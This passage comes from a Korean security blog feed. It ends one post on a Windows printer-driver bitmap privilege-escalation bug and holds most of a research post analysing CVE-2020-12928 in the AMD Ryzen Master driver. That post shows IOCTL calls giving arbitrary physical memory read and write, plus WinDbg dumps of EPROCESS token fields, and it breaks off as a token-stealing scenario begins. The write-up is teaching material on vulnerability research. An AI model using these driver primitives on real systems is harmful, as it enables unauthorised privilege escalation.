&#xC120;&#xD0DD;&#xD558;&#xBA74; <code>hdev</code> &#xD544;&#xB4DC;&#xB294; screen device object&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lisp">DCPrn = CreateCompatibleDC(<span class="hljs-name">CreateDC</span>(<span class="hljs-string">&quot;Microsoft XPS Document Writer&quot;</span>, <span class="hljs-string">&quot;Microsoft XPS Document Writer&quot;</span>, NULL, NULL))<span class="hljs-comment">; </span>DCScr = CreateCompatibleDC(<span class="hljs-number">0</span>)<span class="hljs-comment">; </span> Bitmap = CreateBitmap(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, NULL)<span class="hljs-comment">; </span> PrevBitmap = SelectObject(<span class="hljs-name">DCPrn</span>, Bitmap)<span class="hljs-comment">; // Bitmap&apos;s hdev is set to DCPrn&apos;s hdev </span>SelectObject(<span class="hljs-name">DCPrn</span>, PrevBitmap)<span class="hljs-comment">; </span> SelectObject(<span class="hljs-name">DCScr</span>, Bitmap)<span class="hljs-comment">;              // Bitmap&apos;s hdev is set to DCScr&apos;s hdev</span></code></pre><p>&#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD574;&#xC11C; Windows Vista&#xAE4C;&#xC9C0;&#xB294; kernel-mode&#xC640; user-mode&#xC5D0; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xACF5;&#xC874;&#xD558;&#xC600;&#xC9C0;&#xB9CC;, &#xADF8; &#xC774;&#xD6C4;&#xC5D0;&#xB294; user-mode driver&#xB9CC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD504;&#xB9B0;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xCC98;&#xB9AC;&#xB97C; &#xC704;&#xD574; &#xCEE4;&#xB110;&#xC5D0;&#xB294; user-mode&#xC5D0; &#xB300;&#xD55C; &#xCF5C;&#xBC31;&#xC744; &#xB9CC;&#xB4DC;&#xB294; stub&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. user-mode &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC77C;&#xBD80; kernel-mode API&#xC5D0;&#xB294; user-mode API&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>EngAssociateSurface</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; <code>hdev</code>, <code>dhpdev</code>, <code>flHooks</code>&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; flHooks&#xB97C; &#xD1B5;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xB2E4;&#xB978; &#xC545;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>SelectObject</code>&#xC5D0;&#xC11C; <code>win32kbase.sys!blsSurfaceAllowedInDC</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; surface object&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>printer</tag>
      
      <tag>bitmap</tag>
      
      <tag>device object</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master 분석(2)</title>
    <link href="/2021/07/28/l0ch/windows-driver-part3/"/>
    <url>/2021/07/28/l0ch/windows-driver-part3/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 1 - Setting Up Kernel Debugging</a></p><p><a href="https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(1)</a></p><p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(2) &#x2190; Now!</p><p><a href="http://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3)</a></p><hr><p>&#xC800;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0; &#xC774;&#xC5B4; &#xBC14;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xC774;&#xC5B4;&#xAC00;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</p><p>IOCTL <code>0x81112F08</code>&#xC740; &#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xBC1B;&#xC544; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC744; &#xC77D;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xAC00;&#xC9C4; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC6B0;&#xC120; Windbg&#xC5D0;&#xC11C; <code>0x81112F08</code>&#xB8E8;&#xD2F4; <code>sub_1400063D0</code>&#xC744; &#xD638;&#xCD9C;&#xD55C; &#xC9C1;&#xD6C4;&#xC778; <code>AMDRyzenMasterDriver+0x63d5</code> &#xC704;&#xCE58;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xACE0;, input buffer&#xC5D0; &#xB300;&#xCDA9; &#xC544;&#xBB34; &#xAC12;&#xC774;&#xB098; &#xB123;&#xACE0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305;&#xC740; Part 1&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs c">BYTE input_buff[<span class="hljs-number">0x1000</span>] = { <span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>};<span class="hljs-comment">// 0x4141414141414141</span><span class="hljs-comment">// 0x0000000000000001</span>DeviceIoControl(dHandle, <span class="hljs-number">0x81112F08</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))</code></pre><p><img src="/2021/07/28/l0ch/windows-driver-part3/2.png" alt="windows-driver-part3/2.png"></p><p>input buffer&#xC758; <code>0x4141414141414141</code>&#xACFC; <code>0x00000001</code>&#xC774; <code>sub_1400063D0</code>&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;. <del>&#xB09C; &#xC800; 0x41414141 &#xBCFC; &#xB54C; &#xAE30;&#xBD84;&#xC774; &#xC81C;&#xC77C; &#xC88B;&#xB354;&#xB77C;</del>  &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled.png" alt="windows-driver-part3/Untitled.png"></p><p><code>a1</code> &#x2192; <code>0x4141414141414141</code> &#xACFC; <code>a2</code>&#x2192;<code>0x00000001</code>  &#xAC00; <code>MmMapIoSpace</code> &#xD568;&#xC218;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>a3</code>&#xB294; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xACF5;&#xAC04;&#xC774;&#xB2C8; output&#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.  </p><blockquote><p><code>0x81112F08</code>&#xC740; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes">METHOD_BUFFERED</a>&#xB85C; input buffer&#xC640; output buffer&#xAC00; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 read_addr;     DWORD num_of_bytes;} READ_INPUT_BUFFER;</code></pre><p><code>0x81112F08</code>&#xC758; input buffer structure&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; user input&#xC744; &#xD1B5;&#xD574; <code>0x81112F08</code> &#xB8E8;&#xD2F4;&#xC758; <code>MmMapIoSpace</code>&#xC5D0; &#xC784;&#xC758;&#xC758; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xB9E4;&#xD551; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC904; &#xC218; &#xC788;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC5B4; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xAC12;&#xC744; &#xC4F0;&#xB294; <code>0x81112F0C</code> &#xC758; &#xB8E8;&#xD2F4;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>arbitrary read/write primitive&#xB97C; &#xBAA8;&#xB450; &#xC5BB;&#xC5C8;&#xB124;&#xC694;! &#xC774;&#xC81C; &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="EPROCESS"><a href="#EPROCESS" class="headerlink" title="EPROCESS"></a>EPROCESS</h1><p>&#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xAD6C;&#xC0C1;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xADF8;&#xC804;&#xC5D0; &#xBA3C;&#xC800; Windows&#xC758; &#xAD8C;&#xD55C;&#xACFC; EPROCESS&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. </p><p>Windows&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; EPROCESS, KPROCESS, ETHREAD, KTHREAD, PEB, PCB &#xB4F1;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; EPROCESS&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xB420; &#xB54C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD574; &#xCEE4;&#xB110; &#xC601;&#xC5ED;&#xC5D0; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xAC01;&#xAC01;&#xC758; EPROCESS&#xB97C; &#xD558;&#xB098;&#xC529; &#xAC16;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. EPROCESS&#xC5D0;&#xB294; &#xAD49;&#xC7A5;&#xD788; &#xB9CE;&#xC740; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xB098; &#xC624;&#xB298; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2DD;&#xBCC4;&#xACFC; &#xAD8C;&#xD55C; &#xBD80;&#xBD84;&#xB9CC; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xBA3C;&#xC800; Windbg&#xC5D0;&#xC11C; <code>!process 0 0</code>&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA9;&#xB85D;&#xC744; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> **** NT ACTIVE PROCESS DUMP ****PROCESS ffffe405ac497080    SessionId: none  Cid: <span class="hljs-number">0004</span>    Peb: <span class="hljs-number">00000000</span>  ParentCid: <span class="hljs-number">0000</span>    DirBase: <span class="hljs-number">001</span>ad000  ObjectTable: ffff990be8c97e40  HandleCount: <span class="hljs-number">2401.</span>    Image: SystemPROCESS ffffe405ac491080    SessionId: none  Cid: <span class="hljs-number">005</span>c    Peb: <span class="hljs-number">00000000</span>  ParentCid: <span class="hljs-number">0004</span>    DirBase: <span class="hljs-number">00303000</span>  ObjectTable: ffff990be8c7c080  HandleCount:   <span class="hljs-number">0.</span>    Image: Registry...PROCESS ffffe405af71c0c0    SessionId: <span class="hljs-number">0</span>  Cid: <span class="hljs-number">02</span>a8    Peb: eb1cdc9000  ParentCid: <span class="hljs-number">01f</span>4    DirBase: <span class="hljs-number">20b</span>497000  ObjectTable: ffff990bec67be00  HandleCount: <span class="hljs-number">1249.</span>    Image: lsass.exe..</code></pre><p>&#xD604;&#xC7AC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB9AC;&#xC2A4;&#xD2B8;&#xAC00; &#xB739;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB9CE;&#xC73C;&#xB2C8;.. &#xBA87; &#xAC1C; &#xB098;&#xC624;&#xBA74; &#xC911;&#xB2E8;&#xD558;&#xACE0;, <code>lsass.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><blockquote><p>lsass.exe : &#xB85C;&#xCEEC; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C; &#xC11C;&#xBE44;&#xC2A4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC15;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xC708;&#xB3C4;&#xC6B0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xCEF4;&#xD4E8;&#xD130;&#xB098; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294; &#xC720;&#xC800;&#xB4E4;&#xC758; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBA70;, &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xBCC0;&#xACBD;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xACE0;, &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xB610;&#xD55C; Windows Security Log&#xB97C; &#xC791;&#xC131;&#xD55C;&#xB2E4;.<br>(&#xB531; &#xBD10;&#xB3C4; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC19;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;&#x314E;&#x314E;)</p></blockquote><p><code>lsass.exe</code> &#xC758; EPROCESS&#xB97C; &#xC0B4;&#xD3B4;&#xBCFC; &#xAC74;&#xB370;, EPROCESS &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xB531; &#xC138; &#xAC00;&#xC9C0; &#xD544;&#xB4DC;&#xB9CC; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; <code>UniqueProcessId</code>, <code>Token</code>, <code>ImageFileName</code> &#xC785;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dt nt!_EPROCESS ffffe405af71c0c0 UniqueProcessId Token ImageFilename   +<span class="hljs-number">0x440</span> UniqueProcessId : <span class="hljs-number">0x00000000</span>`<span class="hljs-number">000002</span>a8 Void   +<span class="hljs-number">0x4b8</span> Token           : _EX_FAST_REF   +<span class="hljs-number">0x5a8</span> ImageFileName   : [<span class="hljs-number">15</span>]  <span class="hljs-string">&quot;lsass.exe&quot;</span>* &#xC624;&#xD504;&#xC14B;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xBCC4; &#xC0C1;&#xC774;</code></pre><p>&#xC6B0;&#xC120;&#xC740; &#xD574;&#xB2F9; &#xD544;&#xB4DC;&#xB4E4;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><ul><li><code>UniqueProcessId</code> : &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID)</li><li><code>Token</code> : &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;</li><li><code>ImageFileName</code> : &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC774;&#xB984;</li></ul><p><code>UniqueProcessId</code>&#xC640; <code>ImageFileName</code>&#xC740; &#xB530;&#xB85C; &#xC124;&#xBA85;&#xC774; &#xD544;&#xC694; &#xC5C6;&#xC744; &#xAC83; &#xAC19;&#xC73C;&#xB2C8;, <code>Token</code>&#xC5D0; &#xB300;&#xD574; &#xC880; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Token-Privilege-identification-value"><a href="#Token-Privilege-identification-value" class="headerlink" title="Token - Privilege identification value"></a>Token - Privilege identification value</h2><p>Windows&#xC5D0;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBCC4;&#xB85C; &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; &#xD558;&#xB098;&#xB97C; Process Token&#xC774;&#xB77C;&#xACE0; &#xD558;&#xBA70;  Token&#xC5D0;&#xB294; &#xD2B9;&#xAD8C; &#xB808;&#xBCA8;&#xC778; Privileges&#xAC00; &#xC874;&#xC7AC;&#xD574; &#xC774;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C; &#xC218;&#xC900;&#xC774; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4; </p><p>&#xC704; <code>lsass.exe</code>&#xC758; Token&#xC744; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dx -id <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,ffffe405ac497080 -r1 (*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405af71c578</span>))(*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405af71c578</span>))                 [Type: _EX_FAST_REF]    [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">void</span> *]    [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0xc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p><code>Value</code> &#xD544;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A0;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC8FC;&#xC5B4;&#xC9C4; Token Value&#xC778;&#xC9C0;&#xB294; <code>!token [Value &amp; 0xffffffffffffffff0]</code>&#xC640; &#xAC19;&#xC774; &#xD558;&#xC704; 4bit&#xB97C; 0&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !token <span class="hljs-number">0xffff990bec2356b0</span>_TOKEN <span class="hljs-number">0xffff990bec2356b0</span>TS Session ID: <span class="hljs-number">0</span>User: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span>User Groups:  <span class="hljs-number">00</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-544</span>    Attributes - Default Enabled Owner  <span class="hljs-number">01</span> S<span class="hljs-number">-1</span><span class="hljs-number">-1</span><span class="hljs-number">-0</span>    Attributes - Mandatory Default Enabled  <span class="hljs-number">02</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-11</span>    Attributes - Mandatory Default Enabled  <span class="hljs-number">03</span> S<span class="hljs-number">-1</span><span class="hljs-number">-16</span><span class="hljs-number">-16384</span>    Attributes - GroupIntegrity GroupIntegrityEnabled Primary Group: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span>Privs:  <span class="hljs-number">02</span> <span class="hljs-number">0x000000002</span> SeCreateTokenPrivilege            Attributes - Enabled  <span class="hljs-number">03</span> <span class="hljs-number">0x000000003</span> SeAssignPrimaryTokenPrivilege     Attributes -  <span class="hljs-number">04</span> <span class="hljs-number">0x000000004</span> SeLockMemoryPrivilege             Attributes - Enabled Default  <span class="hljs-number">05</span> <span class="hljs-number">0x000000005</span> SeIncreaseQuotaPrivilege          Attributes -  <span class="hljs-number">07</span> <span class="hljs-number">0x000000007</span> SeTcbPrivilege                    Attributes - Enabled Default  <span class="hljs-number">08</span> <span class="hljs-number">0x000000008</span> SeSecurityPrivilege               Attributes -  <span class="hljs-number">09</span> <span class="hljs-number">0x000000009</span> SeTakeOwnershipPrivilege          Attributes -  <span class="hljs-number">10</span> <span class="hljs-number">0x00000000a</span> SeLoadDriverPrivilege             Attributes -  <span class="hljs-number">11</span> <span class="hljs-number">0x00000000b</span> SeSystemProfilePrivilege          Attributes - Enabled Default...</code></pre><p>User&#xB97C; &#xBCF4;&#xBA74; <code>S-1-5-18</code> &#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; SID(Security Identifier)&#xB77C;&#xACE0; &#xD558;&#xBA70;, &#xAC01; &#xC0AC;&#xC6A9;&#xC790;&#xC758; SID&#xB294; <a href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%201.png" alt="windows-driver-part3/Untitled%201.png"></p><p><code>NT AUTHORITY\SYSTEM</code> &#xACC4;&#xC815;&#xC758; &#xAD8C;&#xD55C;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;!</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/3.png" alt="windows-driver-part3/3.png"></p><p>Process Monitor&#xB85C; &#xD655;&#xC778;&#xD574;&#xB3C4; &#xC5ED;&#xC2DC;&#xB098; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h1><p>Token&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xC694;&#xC18C;&#xB77C;&#xBA74; <code>lsass.exe</code>&#xC640; &#xAC19;&#xC774; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xB294; <code>NT AUTHORITY\SYSTEM</code> &#xACC4;&#xC815; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token&#xC744; &#xC77C;&#xBC18; 